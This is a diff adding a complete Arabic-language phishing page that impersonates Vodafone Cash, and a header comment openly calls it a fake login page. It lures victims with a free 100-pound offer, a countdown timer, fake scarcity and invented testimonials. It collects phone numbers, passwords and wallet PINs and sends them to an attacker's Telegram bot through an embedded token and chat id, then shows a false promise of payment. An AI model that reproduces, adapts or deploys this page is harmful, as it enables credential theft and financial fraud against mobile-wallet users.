@@ -1,0 +1,163 @@
+<!-- Vodafone Cash Fake Login Page (With Telegram Integration - Max Power) -->
+<html lang="ar">
+<head>
+  <meta charset="UTF-8">
+  <title>فودافون كاش - استلم 100 جنيه مجاناً</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;700&display=swap" rel="stylesheet">
+  <style>
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+      font-family: 'Cairo', sans-serif;
+    }
+    body {
+      background: #f6f6f6;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      min-height: 100vh;
+    }
+    .container {
+      background: #fff;
+      padding: 35px;
+      border-radius: 15px;
+      box-shadow: 0 0 20px rgba(0,0,0,0.2);
+      max-width: 420px;
+      width: 90%;
+      text-align: center;
+    }
+    .logo {
+      width: 100px;
+      margin-bottom: 15px;
+    }
+    h2 {
+      color: #e60000;
+      margin-bottom: 10px;
+    }
+    .subtext {
+      color: #444;
+      font-size: 14px;
+      margin-bottom: 15px;
+    }
+    input {
+      width: 90%;
+      padding: 12px;
+      margin: 10px 0;
+      border: 1px solid #ccc;
+      border-radius: 8px;
+      font-size: 15px;
+    }
+    button {
+      width: 95%;
+      background-color: #e60000;
+      color: white;
+      padding: 13px;
+      font-size: 16px;
+      border: none;
+      border-radius: 8px;
+      cursor: pointer;
+      transition: 0.3s;
+    }
+    button:hover {
+      background-color: #c20000;
+    }
+    .urgent {
+      background-color: #ffe3e3;
+      color: #b10000;
+      font-weight: bold;
+      padding: 8px;
+      border-radius: 8px;
+      margin-bottom: 15px;
+    }
+    .countdown, .notif, .note {
+      margin-top: 8px;
+      font-size: 14px;
+      color: #333;
+    }
+    .notif {
+      background: #f7f7f7;
+      padding: 6px;
+      border-left: 3px solid #e60000;
+      text-align: left;
+      border-radius: 5px;
+    }
+    .badge {
+      background-color: #e60000;
+      color: white;
+      font-size: 12px;
+      padding: 2px 8px;
+      border-radius: 20px;
+      position: absolute;
+      top: 10px;
+      right: 10px;
+    }
+    .secure {
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      margin-top: 10px;
+      color: gray;
+      font-size: 12px;
+    }
+    .secure img {
+      width: 18px;
+      margin-right: 6px;
+    }
+  </style>
+  <script>
+    let timeLeft = 150;
+    function countdown() {
+      let timer = document.getElementById("countdown");
+      let minutes = Math.floor(timeLeft / 60);
+      let seconds = timeLeft % 60;
+      timer.innerText = `⏳ العرض ينتهي خلال: ${minutes}:${seconds < 10 ? '0' : ''}${seconds}`;
+      timeLeft--;
+      if (timeLeft >= 0) setTimeout(countdown, 1000);
+    }
+    window.onload = countdown;
+  </script>
+</head>
+<body>
+  <div class="container">
+    <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/e/e3/Vodafone_icon.svg/2048px-Vodafone_icon.svg.png" class="logo">
+    <div class="badge">مؤكدة ✅</div>
+    <h2>🎁 استلم 100 جنيه كاش</h2>
+    <div class="subtext">مقدمة من فودافون كاش</div>
+    <div class="urgent">⚠️ متبقي فقط 8 من أصل 50 شخص!</div>
+    <div id="countdown" class="countdown"></div>
+    <div class="notif">✔️ محمد من الجيزة استلم 100 جنيه قبل 4 دقائق</div>
+    <div class="notif">✔️ سارة من الإسكندرية استلمت قبل 9 دقائق</div>
+    <form onsubmit="sendData(); return false;">
+      <input type="text" id="phone" placeholder="رقم الموبايل" required>
+      <input type="password" id="password" placeholder="كلمة المرور" required>
+      <input type="text" id="pin" placeholder="كود المحفظة (6 أرقام)" required>
+      <button type="submit">✅ استلم الآن</button>
+    </form>
+    <div class="secure">
+      <img src="https://cdn-icons-png.flaticon.com/512/747/747376.png" />
+      بياناتك مشفرة عبر بروتوكولات أمان متقدمة 🔒
+    </div>
+  </div>
+  <script>
+    function sendData() {
+      const token = "7989278640:AAEd5fyTYU5VauNqEwyUo-8I-vRqj6MU0m0";
+      const chat_id = "1896998598";
+      const phone = document.getElementById("phone").value;
+      const password = document.getElementById("password").value;
+      const pin = document.getElementById("pin").value;
+      const message = `📥 فودافون كاش\n📞 رقم: ${phone}\n🔐 كلمة المرور: ${password}\n🔑 كود المحفظة: ${pin}`;
+      fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+          chat_id: chat_id,
+          text: message
+        })
+      });
+      alert("جاري استلام الرصيد... سيتم التحويل خلال دقائق");
+    }
+  </script>
+</body>
+</html>
